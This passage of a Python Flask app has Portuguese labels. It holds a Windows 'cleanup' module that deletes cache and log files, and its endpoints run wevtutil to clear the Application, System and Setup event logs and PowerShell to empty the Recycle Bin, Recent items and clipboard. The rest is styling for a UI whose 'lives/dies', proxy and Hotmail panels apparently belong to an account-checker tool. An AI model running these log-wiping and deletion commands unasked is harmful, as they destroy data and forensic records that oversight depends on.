    "prefetch": ("Prefetch", "Cache de inicializacao recriado pelo Windows."),
    "thumbnails": ("Miniaturas do Windows", "Cache de miniaturas recriado automaticamente."),
    "browser_cache": ("Cache de navegadores", "Cache temporario de Chrome, Edge, Firefox, Brave e Opera GX."),
    "crash_dumps": ("Relatorios de falha", "Arquivos de diagnostico de falhas."),
    "old_logs": ("Logs antigos", "Arquivos de log, dump e temporarios antigos."),
}


def l6_windows():
    return platform.system().lower() == "windows"


def l6_paths():
    paths = {key: [] for key in L6_CATEGORIES}
    paths["user_temp"] = [Path(tempfile.gettempdir())]
    if not l6_windows():
        return paths
    windir = Path(os.environ.get("WINDIR", r"C:\Windows"))
    local = Path(os.environ.get("LOCALAPPDATA", windir))
    roaming = Path(os.environ.get("APPDATA", local))
    paths["windows_temp"] = [windir / "Temp"]
    paths["windows_update"] = [windir / "SoftwareDistribution" / "Download"]
    paths["prefetch"] = [windir / "Prefetch"]
    paths["thumbnails"] = [local / "Microsoft" / "Windows" / "Explorer"]
    paths["crash_dumps"] = [local / "CrashDumps"]
    paths["browser_cache"] = [
        local / "Google" / "Chrome" / "User Data",
        local / "Microsoft" / "Edge" / "User Data",
        local / "BraveSoftware" / "Brave-Browser" / "User Data",
        roaming / "Opera Software" / "Opera GX Stable",
        roaming / "Mozilla" / "Firefox" / "Profiles",
    ]
    paths["old_logs"] = [local / "Temp", local / "CrashDumps"]
    return paths


def l6_files(category):
    count = 0
    for root in l6_paths().get(category, []):
        if not root.exists():
            continue
        try:
            for current, dirs, files in os.walk(root, topdown=True, followlinks=False):
                dirs[:] = [d for d in dirs if not (Path(current) / d).is_symlink()]
                for filename in files:
                    path = Path(current) / filename
                    if path.is_symlink():
                        continue
                    lower = filename.lower()
                    if category == "thumbnails" and not lower.startswith("thumbcache_"):
                        continue
                    if category == "prefetch" and not lower.endswith(".pf"):
                        continue
                    if category == "browser_cache" and lower in {"cookies", "history", "login data", "web data", "favicons"}:
                        continue
                    if category == "old_logs":
                        if not lower.endswith((".log", ".dmp", ".etl", ".tmp")):
                            continue
                        if time.time() - path.stat().st_mtime < 30 * 86400:
                            continue
                    yield path
                    count += 1
                    if count >= 12000:
                        return
        except (OSError, PermissionError):
            continue


def l6_scan():
    result = {}
    total_files = 0
    total_bytes = 0
    for key, (name, description) in L6_CATEGORIES.items():
        files = 0
        size = 0
        for path in l6_files(key):
            try:
                files += 1
                size += path.stat().st_size
            except (OSError, PermissionError):
                pass
        result[key] = {"name": name, "description": description, "files": files, "bytes": size}
        total_files += files
        total_bytes += size
    return {"supported": l6_windows(), "items": result, "total_files": total_files, "total_bytes": total_bytes}


def l6_run(command, timeout=90):
    if not l6_windows():
        return {"ok": False, "message": "Esta rotina so funciona no Windows."}
    try:
        completed = subprocess.run(command, capture_output=True, text=True, encoding="cp850", errors="replace", timeout=timeout, shell=False)
        return {"ok": completed.returncode == 0, "output": (completed.stdout or completed.stderr or "").strip()[-2500:]}
    except (OSError, subprocess.SubprocessError) as exc:
        return {"ok": False, "message": str(exc)}


@app.route('/limpeza6/scan', methods=['GET'])
def l6_scan_route():
    return jsonify(l6_scan())


@app.route('/limpeza6/clean', methods=['POST'])
def l6_clean_route():
    data = request.get_json(silent=True) or {}
    if data.get("confirmed") is not True:
        return jsonify({"error": "Confirmacao obrigatoria."}), 400
    selected = data.get("categories", [])
    result = []
    for category in selected:
        if category not in L6_CATEGORIES:
            continue
        removed = 0
        skipped = 0
        bytes_removed = 0
        for path in l6_files(category):
            try:
                size = path.stat().st_size
                path.unlink()
                removed += 1
                bytes_removed += size
            except (OSError, PermissionError):
                skipped += 1
        result.append({"id": category, "removed": removed, "skipped": skipped, "bytes": bytes_removed})
    return jsonify({"ok": True, "results": result})


@app.route('/limpeza6/action', methods=['POST'])
def l6_action_route():
    data = request.get_json(silent=True) or {}
    if data.get("confirmed") is not True:
        return jsonify({"error": "Confirmacao obrigatoria."}), 400
    action = data.get("action")
    commands = {
        "dns": [["ipconfig", "/flushdns"]],
        "renew": [["ipconfig", "/release"], ["ipconfig", "/renew"]],
        "reset": [["ipconfig", "/flushdns"], ["netsh", "winsock", "reset"], ["netsh", "int", "ip", "reset"], ["netsh", "interface", "ipv6", "reset"], ["arp", "-d", "*"], ["ipconfig", "/release"], ["ipconfig", "/renew"]],
        "recycle": [["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "Clear-RecycleBin -Force"]],
        "events": [["wevtutil.exe", "cl", "Application"], ["wevtutil.exe", "cl", "System"], ["wevtutil.exe", "cl", "Setup"]],
        "recent": [["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "Remove-Item -LiteralPath ($env:APPDATA + '\\Microsoft\\Windows\\Recent\\*') -Force -Recurse -ErrorAction SilentlyContinue"]],
        "clipboard": [["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", "Set-Clipboard -Value $null"]],
    }
    if action not in commands:
        return jsonify({"error": "Acao desconhecida."}), 400
    results = []
    for command in commands[action]:
        results.append({"command": " ".join(command), **l6_run(command)})
    return jsonify({"ok": all(item.get("ok") for item in results), "results": results})


@app.route('/limpeza6/info', methods=['GET'])
def l6_info_route():
    try:
        root = os.environ.get("SystemDrive", "C:\\") if l6_windows() else "/"
        disk = shutil.disk_usage(root)
        disk_data = {"total": disk.total, "used": disk.used, "free": disk.free}
    except OSError:
        disk_data = {"total": 0, "used": 0, "free": 0}
    return jsonify({"hostname": socket.gethostname(), "system": platform.system(), "release": platform.release(), "version": platform.version(), "machine": platform.machine(), "processor": platform.processor() or "N/A", "python": platform.python_version(), "cpu": os.cpu_count() or 0, "disk": disk_data})

@app.route('/limpeza6/analyze/<target>', methods=['GET'])
def l6_analyze_route(target):
    """Analises somente leitura especificas para cada subaba da LIMPEZA 6."""
    target = target.lower()
    if target in {'limpeza', 'navegadores'}:
        data = l6_scan()
        if target == 'navegadores':
            data['items'] = {'browser_cache': data['items'].get('browser_cache', {})}
        return jsonify({'target': target, 'analysis': data})
    if target == 'info':
        return jsonify({'target': target, 'analysis': l6_info_route().get_json()})
    if target == 'privacidade':
        recent = Path(os.environ.get('APPDATA', '')) / 'Microsoft' / 'Windows' / 'Recent' if l6_windows() else Path()
        count = 0
        if recent.exists():
            try:
                count = sum(1 for item in recent.iterdir() if item.is_file())
            except OSError:
                count = 0
        return jsonify({'target': target, 'analysis': {'recent_items': count, 'clipboard': 'nao lido durante analise'}})
    if target == 'sistema':
        return jsonify({'target': target, 'analysis': {'system': platform.system(), 'release': platform.release(), 'cpu': os.cpu_count() or 0, 'temp_scan': l6_scan()}})
    if target == 'rede':
        checks = []
        for command in (["ipconfig", "/all"], ["ping", "-n", "1", "127.0.0.1"]):
            result = l6_run(command, timeout=20)
            checks.append({'command': ' '.join(command), 'ok': result.get('ok', False), 'output': result.get('output', result.get('message', ''))[-1200:]})
        return jsonify({'target': target, 'analysis': {'supported': l6_windows(), 'checks': checks}})
    return jsonify({'error': 'Subaba desconhecida.'}), 404

# HTML TEMPLATE COM 5 CHECKBOXES E OPCOES HOTMAIL
# =========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRWED03 - 5 em 1</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&family=JetBrains+Mono&family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #06060a;
            --bg-card: rgba(12, 10, 20, 0.95);
            --border-color: rgba(255, 255, 255, 0.06);
            --glow-purple: #6b2bff;
            --purple-deep: #3d0a8f;
            --violet-magenta: #a855f7;
            --text-main: #ededf5;
            --text-muted: #8888a0;
            --glass-bg: rgba(6, 4, 14, 0.85);
            --glass-border: rgba(120, 50, 255, 0.1);
            --accent-cyan: #00f0e0;
            --accent-red: #ff0040;
            --accent-green: #00ff75;
            --hotmail-blue: #0078d4;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg-primary);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 0;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.02'/%3E%3C/svg%3E");
            pointer-events: none;
            z-index: -1;
            opacity: 0.6;
        }

        .app-container { max-width: 1100px; width: 100%; padding: 1.5rem 1.5rem 3rem; position: relative; z-index: 2; }

        #network-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 0;
            pointer-events: none;
            opacity: 0.2;
        }

        header {
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 99px;
            padding: 0.7rem 1.8rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2.5rem;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
            position: sticky;
            top: 1rem;
            z-index: 100;
        }
        .header-left { display: flex; align-items: center; gap: 1.5rem; }
        .logo-drw { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 1.2rem; color: #fff; letter-spacing: 1px; text-shadow: 0 0 15px rgba(107, 43, 255, 0.2); cursor: pointer;}
        .logo-drw span { color: #6b2bff; }
        .header-nav { display: flex; gap: 2rem; list-style: none; }
        .header-nav a { text-decoration: none; color: var(--text-muted); font-size: 0.85rem; transition: 0.3s ease; font-weight: 500; cursor: pointer; }
        .header-nav a:hover, .header-nav a.active { color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.1); }
        .header-right { display: flex; align-items: center; gap: 1rem; }
        .header-tag { font-size: 0.8rem; color: var(--text-muted); background: rgba(255,255,255,0.04); padding: 0.3rem 1rem; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); }
        .telegram-link-header {
            display: flex; align-items: center; gap: 0.6rem;
            background: rgba(36, 156, 241, 0.1); padding: 0.4rem 1.2rem;
            border-radius: 20px; border: 1px solid rgba(36, 156, 241, 0.2);
            text-decoration: none; color: #fff; font-size: 0.85rem;
            transition: all 0.3s ease;
        }
        .telegram-link-header:hover { border-color: #249cf1; box-shadow: 0 0 20px rgba(36, 156, 241, 0.2); transform: translateY(-1px); }

        .section-content { display: none; animation: fadeInUp 0.6s forwards; }
        .section-content.active { display: block; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .hero-section { display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 2rem; padding: 1rem 0; }
        .avatar-wrapper { position: relative; width: 140px; height: 140px; margin-bottom: 1.5rem; }
        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid rgba(123, 44, 255, 0.2); box-shadow: 0 0 30px rgba(75, 15, 143, 0.3); transition: 0.3s ease; }
        .avatar-wrapper:hover .avatar-img { transform: scale(1.02); box-shadow: 0 0 50px rgba(123, 44, 255, 0.4); }
        .avatar-glow { position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border-radius: 50%; background: radial-gradient(circle, rgba(123, 44, 255, 0.15) 0%, transparent 70%); z-index: -1; }
        .hero-title { font-family: 'Space Grotesk', sans-serif; font-size: 2.8rem; font-weight: 700; background: linear-gradient(135deg, #fff 0%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.2rem; }
        .hero-subtitle { color: var(--text-muted); font-size: 1rem; letter-spacing: 2px; margin-bottom: 0.5rem; }
        .hero-creator-link { font-family: 'JetBrains Mono', monospace; color: #6b2bff; font-size: 1.1rem; text-decoration: none; transition: 0.3s ease; }
        .hero-creator-link:hover { text-shadow: 0 0 15px rgba(107, 43, 255, 0.6); color: #fff; }

        .api-selector {
            display: flex;
            gap: 0.8rem;
            justify-content: center;
            margin-bottom: 1.8rem;
            flex-wrap: wrap;
        }
        .api-checkbox {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background: var(--bg-card);
            padding: 0.5rem 1rem;
            border-radius: 10px;
            border: 2px solid transparent;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .api-checkbox:hover { border-color: rgba(107, 43, 255, 0.3); }
        .api-checkbox.selected { border-color: #6b2bff; box-shadow: 0 0 20px rgba(107, 43, 255, 0.15); }
        .api-checkbox input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #6b2bff;
            cursor: pointer;
        }
        .api-checkbox label {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-main);
            cursor: pointer;
        }
        .api-checkbox .api-badge {
            font-size: 0.55rem;
            padding: 0.1rem 0.4rem;
            border-radius: 4px;
            background: rgba(107, 43, 255, 0.2);
            color: #a855f7;
        }
        .api-checkbox .api-badge.hotmail-badge { background: rgba(0, 120, 212, 0.2); color: #0078d4; }

        .cards-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
        .premium-card { background: var(--bg-card); backdrop-filter: blur(16px); border: 1px solid var(--border-color); border-radius: 16px; padding: 1.2rem 1rem; box-shadow: 0 20px 60px rgba(0,0,0,0.45); transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); position: relative; perspective: 800px; }
        .premium-card:hover { transform: translateY(-4px) rotateX(2deg) rotateY(2deg) scale(1.02); border-color: rgba(107, 43, 255, 0.3); box-shadow: 0 30px 80px rgba(0,0,0,0.7); }
        .card-approved { border-left: 3px solid rgba(0, 230, 118, 0.4); }
        .card-rejected { border-left: 3px solid rgba(255, 82, 82, 0.4); }
        .card-tested { border-left: 3px solid rgba(107, 43, 255, 0.4); }
        .card-loaded { border-left: 3px solid rgba(36, 156, 241, 0.4); }
        .card-icon { font-size: 1.2rem; opacity: 0.7; margin-bottom: 0.2rem; }
        .card-number { font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; line-height: 1.1; }
        .card-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 0.2rem; display: block; }
        .card-indicator { position: absolute; top: 0.8rem; right: 0.8rem; width: 6px; height: 6px; border-radius: 50%; box-shadow: 0 0 8px currentColor; }
        .ind-approved { background: #00e676; color: #00e676; }
        .ind-rejected { background: #ff5252; color: #ff5252; }
        .ind-tested { background: #6b2bff; color: #6b2bff; }
        .ind-loaded { background: #249cf1; color: #249cf1; }

        .input-section { background: var(--bg-card); backdrop-filter: blur(16px); border: 1px solid var(--glass-border); border-radius: 18px; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 20px 60px rgba(0,0,0,0.45); }
        .input-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.6rem; }
        .input-label { font-size: 0.75rem; letter-spacing: 1px; color: var(--text-muted); text-transform: uppercase; }
        .input-actions { display: flex; gap: 0.5rem; flex-wrap: wrap; }
        .btn-action { background: transparent; border: 1px solid rgba(255,255,255,0.08); color: var(--text-muted); padding: 0.25rem 0.8rem; border-radius: 6px; cursor: pointer; font-size: 0.65rem; transition: 0.2s ease; }
        .btn-action:hover { border-color: var(--purple-deep); color: #fff; }
        .input-area { width: 100%; min-height: 120px; background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.05); color: var(--text-main); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 1rem; border-radius: 12px; resize: vertical; transition: 0.3s ease; line-height: 1.5; }
        .input-area:focus { outline: none; border-color: rgba(107, 43, 255, 0.4); box-shadow: 0 0 25px rgba(107, 43, 255, 0.05), inset 0 0 25px rgba(107, 43, 255, 0.02); }
        .input-area::placeholder { color: rgba(255,255,255,0.12); }

        .btn-primary-container { display: flex; justify-content: flex-end; gap: 0.8rem; margin-top: 1rem; align-items: center; flex-wrap: wrap; }
        .threads-control { display: flex; align-items: center; gap: 0.4rem; color: var(--text-muted); font-size: 0.7rem; font-family: 'JetBrains Mono', monospace; }
        .threads-control select { background: rgba(0,0,0,0.5); color: var(--text-main); border: 1px solid rgba(255,255,255,0.1); border-radius: 6px; padding: 0.3rem 0.5rem; font-family: 'JetBrains Mono', monospace; cursor: pointer; font-size: 0.75rem; }
        .threads-control select:focus { outline: none; border-color: var(--glow-purple); }
        .btn-primary { background: linear-gradient(90deg, var(--purple-deep), #6b2bff); color: #fff; border: none; padding: 0.7rem 2.5rem; border-radius: 99px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.4s ease; position: relative; overflow: hidden; box-shadow: 0 4px 25px rgba(61, 10, 143, 0.4); }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 40px rgba(107, 43, 255, 0.5); }
        .btn-primary:active { transform: scale(0.98); }
        .btn-primary::before { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent); transform: skewX(-20deg); transition: 0.6s; }
        .btn-primary:hover::before { left: 200%; }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }

        .btn-stop { background: linear-gradient(90deg, #ff1744, #d50000); color: #fff; border: none; padding: 0.7rem 2rem; border-radius: 99px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.4s ease; box-shadow: 0 4px 25px rgba(255, 23, 68, 0.4); display: none; }
        .btn-stop:hover { transform: translateY(-2px); box-shadow: 0 8px 40px rgba(255, 23, 68, 0.5); }
        .btn-stop:active { transform: scale(0.98); }

        .btn-copy { background: rgba(36, 156, 241, 0.12); border: 1px solid rgba(36, 156, 241, 0.2); color: #fff; padding: 0.3rem 1rem; border-radius: 6px; cursor: pointer; font-size: 0.65rem; transition: 0.3s ease; font-family: 'JetBrains Mono', monospace; }
        .btn-copy:hover { background: rgba(36, 156, 241, 0.2); border-color: #249cf1; }

        .results-wrapper { margin-top: 1.5rem; display: flex; flex-direction: column; gap: 1.2rem; }
        .result-box { background: rgba(10, 7, 18, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 16px; padding: 1rem 1.2rem; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .result-box-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.6rem; flex-wrap: wrap; gap: 0.5rem; }
        .result-box-title { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; display: flex; align-items: center; gap: 6px; }
        .result-box-title.lives { color: #00e676; }
        .result-box-title.dies { color: #ff5252; }

        .result-list { display: flex; flex-direction: column; gap: 0.4rem; max-height: 300px; overflow-y: auto; overflow-x: hidden; padding: 2px 6px 2px 0; }
        .result-list::-webkit-scrollbar { width: 4px; }
        .result-list::-webkit-scrollbar-thumb { background: #3d0a8f; border-radius: 4px; }

        .result-item { display: block; width: 100%; min-height: 2rem; background: rgba(255, 255, 255, 0.02); border-radius: 6px; padding: 0.4rem 0.7rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; line-height: 1.3; border-left: 3px solid transparent; white-space: normal; overflow-wrap: anywhere; word-break: break-word; animation: slideIn 0.25s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-6px); } to { opacity: 1; transform: translateX(0); } }
        .result-item.lives-item { border-left-color: #00e676; color: #a0e6c0; }
        .result-item.dies-item { border-left-color: #ff5252; color: #ff9a9a; }

        .result-item small, .result-item .extra-dados { display: block; width: 100%; color: var(--text-muted); font-size: 0.6rem; line-height: 1.3; white-space: normal; overflow-wrap: anywhere; }
        .result-item small { margin-top: 0.2rem; }
        .result-item .extra-dados { color: #a855f7; margin-top: 0.1rem; }
        .empty-state { color: var(--text-muted); font-size: 0.7rem; font-family: 'JetBrains Mono', monospace; padding: 6px 0; }

        .processing-status { display: none; align-items: center; gap: 0.6rem; color: var(--text-muted); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; }
        .processing-status.active { display: flex; }
        .spinner { width: 16px; height: 16px; border: 2px solid rgba(107, 43, 255, 0.2); border-top: 2px solid #6b2bff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .proxy-alert { background: rgba(255, 0, 60, 0.12); border: 1px solid var(--accent-red); color: #fff; padding: 6px 10px; border-radius: 8px; font-size: 0.65rem; text-align: center; margin-bottom: 0.8rem; display: none; font-family: 'JetBrains Mono', monospace; }
        .proxy-config-box { background: rgba(0,0,0,0.35); border-radius: 10px; padding: 0.6rem 0.8rem; margin-bottom: 0.8rem; border: 1px solid var(--border-color); display: flex; flex-wrap: wrap; align-items: center; gap: 0.6rem; }
        .proxy-config-box .proxy-status { font-size: 0.65rem; color: var(--accent-cyan); font-family: 'JetBrains Mono', monospace; }
        .proxy-config-box input { flex: 1; min-width: 100px; background: rgba(0,0,0,0.5); border: 1px solid var(--border-color); border-radius: 6px; color: var(--accent-cyan); padding: 0.3rem 0.6rem; font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; }
        .proxy-config-box .btn-small { background: transparent; border: 1px solid #222; color: var(--text-muted); padding: 0.2rem 0.6rem; border-radius: 5px; cursor: pointer; font-size: 0.55rem; font-family: 'JetBrains Mono', monospace; transition: 0.2s; }
        .proxy-config-box .btn-small:hover { border-color: var(--accent-cyan); color: #fff; }
        .proxy-config-box .btn-success { background: #00a86b; border: 1px solid #00ff88; color: #fff; padding: 0.2rem 0.6rem; border-radius: 5px; cursor: pointer; font-size: 0.55rem; font-family: 'JetBrains Mono', monospace; transition: 0.2s; }
        .proxy-config-box .btn-success:hover { background: #00c97a; }
        .proxy-usage-text { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; color: var(--accent-cyan); }

        .hotmail-options {
            background: rgba(0, 120, 212, 0.05);
            border: 1px solid rgba(0, 120, 212, 0.2);
            border-radius: 10px;
            padding: 0.8rem 1rem;
            margin-top: 0.8rem;
            margin-bottom: 0.8rem;
            display: none;
        }
        .hotmail-options.show { display: block; }
        .hotmail-options .option-row { display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; margin-top: 0.4rem; }
        .hotmail-options .option-row label { font-size: 0.7rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; display: flex; align-items: center; gap: 0.4rem; cursor: pointer; }
        .hotmail-options .option-row input[type="radio"] { accent-color: #0078d4; }
        .hotmail-options .option-row input[type="text"] { background: rgba(0,0,0,0.5); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-main); padding: 0.3rem 0.6rem; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; flex: 1; min-width: 120px; }
        .hotmail-options .option-row input[type="checkbox"] { accent-color: #0078d4; width: 16px; height: 16px; }

        .btn-cyber { background: transparent; border: 1px solid var(--accent-cyan); color: var(--accent-cyan); padding: 0.5rem 1.2rem; border-radius: 8px; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.65rem; transition: 0.3s; text-transform: uppercase; }
        .btn-cyber:hover { background: rgba(0, 240, 224, 0.08); box-shadow: 0 0 20px rgba(0, 240, 224, 0.08); }
        .btn-danger { background: transparent; border: 1px solid var(--accent-red); color: var(--accent-red); padding: 0.5rem 1.2rem; border-radius: 8px; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.65rem; transition: 0.3s; text-transform: uppercase; }
        .btn-danger:hover { background: rgba(255, 0, 64, 0.08); box-shadow: 0 0 20px rgba(255, 0, 64, 0.08); }
        .btn-danger:disabled { opacity: 0.4; cursor: not-allowed; }

        .btn-row { display: flex; gap: 0.6rem; flex-wrap: wrap; margin-top: 0.6rem; }


        /* ===== LIMPEZA 6: subabas internas ===== */
        .l6-shell { background: rgba(10, 8, 18, 0.92); border: 1px solid var(--glass-border); border-radius: 18px; padding: 1.1rem; }
        .l6-tabs { display: flex; gap: .5rem; flex-wrap: wrap; margin: 1rem 0 1.2rem; border-bottom: 1px solid rgba(255,255,255,.07); padding-bottom: .8rem; }
        .l6-tab { border: 1px solid rgba(255,255,255,.08); background: rgba(255,255,255,.03); color: var(--text-muted); border-radius: 9px; padding: .55rem .8rem; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-size: .68rem; }
        .l6-tab:hover, .l6-tab.active { color: #fff; border-color: #6b2bff; background: rgba(107,43,255,.18); box-shadow: 0 0 18px rgba(107,43,255,.12); }
        .l6-panel { display: none; animation: fadeInUp .35s forwards; }
        .l6-panel.active { display: block; }
        .l6-routine { display: flex; align-items: center; justify-content: space-between; gap: 1rem; border: 1px solid rgba(255,255,255,.06); border-radius: 10px; background: rgba(255,255,255,.025); padding: .85rem 1rem; margin: .55rem 0; }
        .l6-routine strong { display: block; font-size: .78rem; color: #fff; }
        .l6-routine small { color: var(--text-muted); font-size: .64rem; }
        .l6-result { margin-top: .8rem; background: rgba(0,0,0,.38); border: 1px solid rgba(255,255,255,.06); border-radius: 9px; min-height: 45px; padding: .7rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; font-size: .64rem; white-space: pre-wrap; }
        .l6-checks { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap: .5rem; margin: .8rem 0; }
        .l6-check { display: flex; gap: .5rem; align-items: center; padding: .6rem; border: 1px solid rgba(255,255,255,.06); border-radius: 8px; color: #ddd; font-size: .68rem; background: rgba(255,255,255,.02); }
        .l6-check input { accent-color: #6b2bff; }
        .l6-tools { display:flex; gap:.55rem; flex-wrap:wrap; margin:.8rem 0; }
        .l6-config { display:none; border:1px solid rgba(107,43,255,.28); background:rgba(107,43,255,.07); border-radius:10px; padding:.8rem; margin:.7rem 0; }
        .l6-config.open { display:grid; gap:.55rem; }
        .l6-config label { color:var(--text-muted); font-size:.68rem; }
        .l6-config input,.l6-config select { margin-left:.35rem; background:#100d1b; color:#fff; border:1px solid rgba(255,255,255,.12); border-radius:6px; padding:.35rem; }
        .l6-manual { display:none; border-left:3px solid #6b2bff; background:rgba(255,255,255,.035); color:var(--text-muted); border-radius:0 8px 8px 0; padding:.85rem; margin-top:.8rem; font-size:.68rem; line-height:1.55; }
        .l6-manual.open { display:block; }
        .l6-manual strong { color:#fff; }
        .l6-analysis { background:rgba(0,0,0,.25); border:1px solid rgba(0,230,118,.18); border-radius:8px; padding:.7rem; margin:.7rem 0; color:#b9d7c4; font:.67rem 'JetBrains Mono',monospace; white-space:pre-wrap; min-height:2.5rem; }
        .comunidade-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.2rem; margin-top: 1.2rem; }
        .comunidade-card { background: var(--bg-card); border: 1px solid var(--glass-border); border-radius: 16px; padding: 1.2rem; text-align: center; transition: 0.3s; }
        .comunidade-card:hover { border-color: rgba(107, 43, 255, 0.4); transform: translateY(-3px); }
        .comunidade-card h3 { color: #fff; margin-bottom: 0.6rem; font-size: 1.1rem; }
        .comunidade-card p { color: var(--text-muted); margin-bottom: 1rem; text-align: left; font-size: 0.75rem; }
        .code-block { background: rgba(0,0,0,0.5); border: 1px solid var(--accent-cyan); border-radius: 6px; padding: 6px; margin-bottom: 0.8rem; text-align: left; font-family: 'JetBrains Mono', monospace; font-size: 0.6rem; color: var(--accent-cyan); overflow-x: auto; }
        .drop-list { text-align: left; background: rgba(255,255,255,0.02); padding: 0.6rem; border-radius: 8px; margin-bottom: 1rem; }
        .drop-item { margin-bottom: 3px; display: flex; align-items: center; gap: 4px; font-size: 0.7rem; }
        .btn-comunidade { display: inline-block; background: transparent; border: 1px solid #249cf1; color: #249cf1; padding: 6px 16px; border-radius: 50px; text-decoration: none; transition: 0.3s; font-weight: 600; font-size: 0.7rem; }
        .btn-comunidade:hover { background: #249cf1; color: #000; box-shadow: 0 0 20px rgba(36, 156, 241, 0.15); }

        footer { margin-top: 3rem; padding: 1.5rem 0; border-top: 1px solid rgba(255,255,255,0.03); display: flex; flex-direction: column; align-items: center; gap: 0.3rem; color: var(--text-muted); font-size: 0.75rem; }
        footer a { color: #6b2bff; text-decoration: none; transition: 0.2s; }
        footer a:hover { color: #fff; }

        @media (max-width: 992px) { 
            .cards-grid { grid-template-columns: repeat(2, 1fr); }
            header { margin: 0.5rem; padding: 0.5rem 1rem; }
        }
        @media (max-width: 600px) { 
            .app-container { padding: 0.6rem; }
            .hero-title { font-size: 1.8rem; }
            .cards-grid { grid-template-columns: 1fr 1fr; gap: 0.6rem; }
            .header-right { display: none; }
            .header-left { width: 100%; justify-content: center; }
            .header-nav { display: none; }
            .btn-primary { width: 100%; justify-content: center; padding: 0.7rem; font-size: 0.9rem; }
            .btn-stop { width: 100%; justify-content: center; padding: 0.7rem; font-size: 0.9rem; }
            .btn-primary-container { flex-direction: column; align-items: stretch; }
            .threads-control { justify-content: center; }
            .api-selector { flex-direction: column; align-items: center; gap: 0.4rem; }
            .api-checkbox { width: 100%; justify-content: center; }
            .hotmail-options .option-row { flex-direction: column; align-items: stretch; }
        }
    </style>
</head>
<body>

    <canvas id="network-canvas"></canvas>

    <header>
        <div class="header-left">
            <div class="logo-drw" onclick="showSection('home')">[ DRW<span>03</span> ]</div>
            <ul class="header-nav">
                <li><a class="active" onclick="showSection('home')">Inicio</a></li>
                <li><a onclick="showSection('sistema')">Sistema</a></li>
                <li><a onclick="showSection('status')">Status</a></li>
